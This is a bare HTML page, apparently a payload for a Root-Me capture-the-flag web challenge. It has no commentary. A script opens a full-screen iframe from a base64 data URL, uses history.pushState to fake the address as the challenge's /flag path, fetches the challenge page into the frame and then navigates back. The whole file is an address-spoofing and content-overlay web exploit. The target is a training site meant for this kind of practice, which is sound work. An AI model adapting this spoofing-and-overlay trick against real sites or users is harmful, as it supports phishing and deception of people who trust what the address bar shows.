<!doctype html>
<html>
<head>
<script>
addEventListener('DOMContentLoaded', function() {
  const iframe = document.createElement('iframe');
  iframe.src = 'data:text/html;base64,' + btoa(`
    <!doctype html>
    <html>
    <head>
    <script>
      history.pushState({}, '', 'http://challenge01.root-me.org:58007/flag');
      fetch('http://challenge01.root-me.org:58007/')
        .then(r=>r.text())
        .then(html=>document.body.innerHTML=html)
        .finally(()=>setTimeout(()=>history.back(), 10));
    </script>
    </head>
    <body></body>
    </html>
  `);
  
  iframe.style.cssText = 'position:fixed;top:0;left:0;width:100vw;height:100vh;border:none;z-index:999999;background:white';
  document.body.appendChild(iframe);
});
</script>
</head>
<body></body>
</html>
